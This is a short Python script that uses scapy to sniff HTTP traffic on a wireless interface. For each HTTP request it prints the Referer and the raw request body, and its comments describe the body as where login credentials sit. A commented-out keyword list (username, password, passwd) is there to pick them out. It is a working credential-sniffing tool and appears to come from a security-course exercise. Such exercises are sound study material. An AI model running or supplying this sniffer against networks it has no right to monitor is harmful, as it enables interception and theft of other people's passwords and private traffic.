#!/usr/bin/python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # filter=""
    # store: wether to store data in memory
    # prn: specify a callback function
    # fileter: udp(for videos. etc), tcp, arp, port 21 (ftp), port 80, ...
    # but cannot filter http

def process_sniffed_packet(packet):
    # print(packet)
    # print(packet.show())
    # use .show() to check the fields we are looking for
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw): # raw layer for login credentials
            # load = packet[scapy.Raw].load
            # keywords = ["username", "user", "usr", "login", "password", "passwd", "pwd"]
            # for keyword in keywords:
            #     if keyword in load:
            #         print(load)
            #         break
            print(packet["HTTP Request"].Referer),
            # or packet[http.HTTPRequest].Referer
            print(packet[scapy.Raw].load)

sniff("wlx503eaabdf38b")
